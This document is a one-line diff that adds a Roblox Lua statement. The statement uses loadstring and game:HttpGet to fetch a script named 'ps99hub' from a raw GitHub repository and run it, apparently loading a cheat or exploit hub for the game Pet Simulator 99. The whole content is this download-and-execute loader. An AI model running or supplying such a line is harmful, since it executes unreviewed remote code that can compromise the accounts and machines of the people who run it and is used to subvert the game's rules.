@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Scripters/Script/main/ps99hub"))()
